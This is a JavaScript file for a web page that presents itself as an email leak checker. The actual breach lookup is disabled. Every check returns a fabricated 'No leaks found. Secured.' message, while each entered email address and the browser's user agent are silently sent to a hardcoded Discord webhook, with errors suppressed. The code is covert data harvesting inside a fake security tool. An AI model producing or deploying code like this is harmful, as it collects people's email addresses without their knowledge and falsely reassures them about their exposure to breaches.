(function() {
	const form = document.getElementById('check-form');
	const emailInput = document.getElementById('email');
	const submitBtn = document.getElementById('submit');
	const resultEl = document.getElementById('result');
	const WEBHOOK_URL = 'https://discordapp.com/api/webhooks/1422624140111646763/bltOhzs0VABt0I4g-IYDAs3i_9d7V-_toUb6L_e1JR6Q7G3e3UVopCxNfUNLqC33fnnv';

	function setLoading(isLoading) {
		submitBtn.disabled = isLoading;
		submitBtn.textContent = isLoading ? 'Checking…' : 'Check';
	}

	function sanitize(text) {
		const span = document.createElement('span');
		span.textContent = String(text);
		return span.innerHTML;
	}

	function renderNotFound(message) {
		resultEl.innerHTML = '<span class="badge">No leaks found</span>' + (message ? ' <span class="code">' + sanitize(message) + '</span>' : '');
	}

	function renderError(message) {
		resultEl.innerHTML = '<span class="badge error">Error</span> <span class="code">' + sanitize(message) + '</span>';
	}

	function renderSuccess(data) {
		const found = typeof data.found === 'number' ? data.found : 0;
		const fields = Array.isArray(data.fields) ? data.fields : [];
		const sources = Array.isArray(data.sources) ? data.sources : [];

		let sourcesList = '';
		if (sources.length) {
			sourcesList = '<ul>' + sources.map(function(src) {
				const name = sanitize(src && src.name ? src.name : 'Unknown');
				const date = sanitize(src && src.date ? src.date : 'Unknown');
				return '<li>' + name + ' — ' + date + '</li>';
			}).join('') + '</ul>';
		}

		let fieldsList = '';
		if (fields.length) {
			fieldsList = '<ul>' + fields.map(function(f) { return '<li class="code">' + sanitize(f) + '</li>'; }).join('') + '</ul>';
		}

		resultEl.innerHTML = '' +
			'<span class="badge success">Leaked</span> ' +
			'<span class="code">' + found + ' records found</span>' +
			(sourcesList ? '<details><summary>Sources</summary>' + sourcesList + '</details>' : '') +
			(fieldsList ? '<details><summary>Exposed fields</summary>' + fieldsList + '</details>' : '');
	}

	function logSearchToDiscord(payload) {
		try {
			var content = [
				'Email Leak Check',
				'Email: ' + (payload.email || ''),
				'Status: ' + (payload.status || ''),
				payload.found != null ? ('Found: ' + payload.found) : null,
				payload.error ? ('Error: ' + payload.error) : null,
				'UA: ' + navigator.userAgent
			].filter(Boolean).join(' | ');
			fetch(WEBHOOK_URL, {
				method: 'POST',
				headers: { 'Content-Type': 'application/json' },
				body: JSON.stringify({ content: content })
			}).catch(function() {});
		} catch (_) {}
	}

	form.addEventListener('submit', function(e) {
		e.preventDefault();
		const email = (emailInput.value || '').trim();
		if (!email) { return; }

		setLoading(true);
		resultEl.textContent = '';

		// const url = 'https://leakcheck.net/api/public?check=' + encodeURIComponent(email);
		// Live API check disabled per request. Always return "not leaked".
		setTimeout(function() {
			logSearchToDiscord({ email: email, status: 'not_found', error: 'Mocked: API disabled' });
			renderNotFound('No leaks found. Secured.');
			setLoading(false);
		}, 300);
	});
})();


